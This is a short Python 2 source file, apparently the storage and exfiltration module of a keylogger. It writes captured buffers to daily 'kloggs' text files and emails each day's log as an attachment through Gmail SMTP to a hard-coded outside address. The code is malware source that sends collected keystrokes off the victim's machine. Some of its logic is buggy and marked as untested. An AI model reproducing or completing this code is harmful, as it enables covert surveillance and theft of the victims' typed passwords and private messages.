#!/usr/bin/python

import time
import smtplib
from email.MIMEMultipart import MIMEMultipart
from email.MIMEBase import MIMEBase
from email import Encoders

class Saver():
    def __init__(self):
        ## NOT SECURE!!! Don't use your private email to sent emails!!!!
        self.current_time = time.localtime()
        self.filename = ""
        self.smptserver = 'smtp.gmail.com:587'
        self.emailuser = "senderlogin"
        self.emailpasswd = "sendderpassword"
        self.emailaddr = "sendermail"
        self.emaildest = "anondhc@gmail.com"
        ##

    def write_to_file(self, buffer):
        #DONT TESTED
        now_time = time.localtime()
        if (now_time[2] != self.current_time[2]):  # send email once per day
            self.send_to_email()
            pass
        else:
            self.current_time = time.localtime()
            self.filename = ("kloggs_%s_%s_%s.txt" % (self.current_time[0], self.current_time[1], self.current_time[2]))
            print self.filename
            file = open(self.filename, "ab").write(buffer)


    def send_to_email(self):
        # Use gmail? You must turn on low-secure app auth on your accountpage
        server = smtplib.SMTP(self.smptserver)
        server.ehlo()
        server.starttls()
        server.login(self.emailuser, self.emailpasswd)

        SUBJECT = self.filename.rstrip(".txt")+" packs."

        msg = MIMEMultipart()
        msg['Subject'] = SUBJECT
        msg['From'] = self.emailaddr
        msg['To'] = ', '.join(self.emaildest)

        part = MIMEBase('application', "octet-stream")
        part.set_payload(open(self.filename, "rb").read())
        Encoders.encode_base64(part)
        part.add_header('Content-Disposition', 'attachment; filename="%s"'%self.filename)

        msg.attach(part)
        server.sendmail(self.emailaddr,self.emaildest , msg.as_string())
        server.close()

    def set_current_time(self):
        self.current_time = time.localtime()

#if __name__=="__main__":
#    a=Saver()
#    a.send_to_email()